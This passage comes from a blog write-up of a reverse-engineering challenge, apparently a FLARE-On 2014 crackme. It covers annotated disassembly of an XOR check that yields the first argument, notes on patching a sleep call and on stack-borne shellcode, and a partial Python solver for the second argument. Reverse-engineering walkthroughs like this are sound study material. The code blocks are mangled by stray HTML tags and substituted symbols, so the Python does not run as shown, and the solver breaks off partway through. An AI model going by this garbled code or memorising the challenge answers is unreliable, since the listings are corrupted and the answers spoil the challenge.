<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">0000000000437177</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">437177</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437177</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">?</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043717</span><span class="nf">D</span> <span class="nv">movsxd</span>  <span class="nb">rsi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437180</span> <span class="nf">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C0</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437187</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043718</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>       <span class="c1">; rax = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043718</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C8</span><span class="p">],</span> <span class="mh">0FFFFFFFFFFFFFFFFh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437199</span> <span class="nf">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043719</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C8</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdx</span>        <span class="c1">; rdi = arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">AB</span> <span class="nv">repne</span> <span class="nv">scasb</span>             <span class="c1">; strlen(arg1)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">AD</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B0</span> <span class="nv">not</span>     <span class="nb">rax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B3</span> <span class="nv">sub</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">B7</span> <span class="nv">cmp</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; check if counter &amp;lt; 11</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BA</span> <span class="nv">setb</span>    <span class="nb">al</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BD</span> <span class="nv">test</span>    <span class="nb">al</span><span class="p">,</span> <span class="nb">al</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">BF</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">arg1_xor</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mh">0x56</span> <span class="c1">; if counter &amp;lt; 11 jump to for&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">0000000000437149</span> <span class="nv">for_arg1</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">xor</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mh">0x56</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437149</span> <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">?</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043714</span><span class="nf">F</span> <span class="nv">cdqe</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437151</span> <span class="nf">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437158</span> <span class="nf">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">?</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043715</span><span class="nf">E</span> <span class="nv">movsxd</span>  <span class="nb">rdx</span><span class="p">,</span> <span class="nb">edx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437161</span> <span class="nf">add</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437168</span> <span class="nf">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043716</span><span class="nf">B</span> <span class="nv">xor</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">56h</span>             <span class="c1">; xor with 0x56</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">000000000043716</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="nb">dl</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0000000000437170</span> <span class="nf">add</span>     <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">counter_?</span><span class="p">],</span> <span class="mi">1</span>
</span><span class='line'><span class="c1">; jumps back to top&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We see another <code>repne scasb</code>. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with <code>0x56</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>loc_437177 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="mi">11</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x56</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>If the loop is done, the <code>jnz</code> in line 19 will not be triggered and we land somewhere else.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Comparison </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00000000004371</span><span class="nv">C1</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">]</span> <span class="c1">; arg1 xor 0x56</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">C8</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">0Ah</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">CD</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aBngcgDebd</span> <span class="c1">; “bngcg&lt;code&gt;debd&quot;</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">D2</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">D5</span> <span class="nv">call</span>    <span class="nv">sub_400370</span>       <span class="c1">; func(arg1 xor 0x56, hexlify(bngcg&lt;/code&gt;debd) )</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">DA</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; if function is successful, will return 0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">DC</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4371</span><span class="nv">F2</span> <span class="c1">; jumps if return value = 0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Application loads the string <code>bngcg`debd</code> and compares the result of <code>arg1 xor 0x56</code> with it. If both are equal, <code>jz</code> in line 7 will be taken.<br />
We have already seen the transitive property of xor so we can calculate the correct value of first argument which is <code>4815162342</code>. We could also patch the <code>jz</code> to <code>jmp</code> and enter any 10 characters for argument one.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>First argument </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">arg1</span> <span class="n">xor</span> <span class="mh">0x56</span> <span class="o">=</span> <span class="err">“</span><span class="n">bngcg</span><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">debd</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">arg1</span> <span class="o">=</span> <span class="s">&quot;bngcg&lt;/code&gt;debd” xor 0x56</span>
</span><span class='line'><span class="n">arg1</span> <span class="o">=</span> <span class="err">“</span><span class="mi">4815162342</span><span class="err">”</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction <code>mov  cs:byte_729AC2, al</code>. At that address, there are bytes being written and they are in <code>base64</code>. I was stepping through until suddenly everything stopped and I saw that a <code>nanosleep</code> syscall was executed.</p>

<p><img src="/images/2014/flare/6-2.jpg" alt="nanosleep" title="nanosleep" /></p>

<p>I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and <a href="https://twitter.com/FireEye/status/496757071644487680">sub_401164</a> was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Checking argument 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;</span><span class="nf">a</span> <span class="nv">href</span><span class="err">=</span><span class="s">&quot;00007FFF3A5AC3B8  jmp     rbx&quot;</span><span class="o">&gt;</span><span class="nv">stack</span><span class="o">&lt;/</span><span class="nv">a</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="c1">; —————————————————————————&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="err">…</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example <code>arg2[0] ror 0xF2 must equal 0x1B</code>, otherwise <code>jz</code> will be called and application will terminate in <code>loc_7FFF3A5AC3A6</code>. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.</p>

<p>Python does not have <code>ror</code> and <code>rol</code> binary operators so I stole them from <a href="http://www.falatic.com/index.php/108/python-and-bitwise-rotation">here</a>. </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Second argument </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># rol and ror implementations taken from </span>
</span><span class='line'><span class="c"># http://www.falatic.com/index.php/108/python-and-bitwise-rotation&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;rotate-left-0b1001----0b0011&quot;</span><span class="o">&gt;</span><span class="n">Rotate</span> <span class="n">left</span><span class="p">:</span> <span class="mi">0</span><span class="n">b1001</span> <span class="err">–</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">0</span><span class="n">b0011</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="o">=</span><span class="mi">8</span><span class="p">:</span> \
</span><span class='line'>    <span class="p">(</span><span class="n">val</span> <span class="err">« </span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="p">(</span><span class="mi">2</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">|</span> \
</span><span class='line'>    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="p">(</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="err"> »</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;rotate-right-0b1001----0b1100&quot;</span><span class="o">&gt;</span><span class="n">Rotate</span> <span class="n">right</span><span class="p">:</span> <span class="mi">0</span><span class="n">b1001</span> <span class="err">–</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">0</span><span class="n">b1100</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">ror</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="o">=</span><span class="mi">8</span><span class="p">:</span> \
</span><span class='line'>    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="p">(</span><span class="mi">2</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="err"> »</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">|</span> \
</span><span class='line'>    <span class="p">(</span><span class="n">val</span> <span class="err">« </span><span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="p">(</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span><span class='line'>    <span class="n">arg2</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">90</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x1B</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x40</span> <span class="o">^</span> <span class="mh">0xF2</span> <span class="o">^</span> <span class="mh">0xB3</span> <span class="o">^</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x1F</span> <span class="o">^</span> <span class="mh">0x71</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span>  <span class="n">rol</span><span class="p">(</span><span class="mh">0xB0</span> <span class="p">,</span> <span class="mh">0xBC</span><span class="p">)</span>  <span class="o">-</span> <span class="mh">0xA3</span> <span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span>  <span class="p">(</span> <span class="mh">0xE8</span> <span class="o">+</span> <span class="mh">0x79</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0xf6</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="p">,</span> <span class="mh">0x82</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0x1f</span> <span class="o">-</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x4d</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0xAF</span> <span class="o">-</span> <span class="mh">0x3F</span> <span class="p">,</span> <span class="mh">0x2A</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xb8</span> <span class="p">,</span> <span class="mh">0x99</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x54</span> <span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0x5D</span> <span class="p">,</span> <span class="mh">0xBA</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x29</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xED</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xb5</span> <span class="o">+</span> <span class="mh">0xbf</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span><span class="n">ror</span><span class="p">(</span><span class="mh">0xa5</span> <span class="o">-</span> <span class="mh">0x63</span> <span class="o">+</span> <span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7b</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8c</span> <span class="p">,</span> <span class="mh">0xbc</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span> <span class="n">ror</span> <span class="p">(</span> <span class="n">ror</span> <span class="p">(</span> <span class="mh">0xf3</span> <span class="p">,</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">)</span> <span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0xa6</span> <span class="o">-</span> <span class="mh">0xD2</span>  <span class="p">,</span> <span class="mh">0x6E</span> <span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x62</span> <span class="o">-</span> <span class="mh">0x34</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
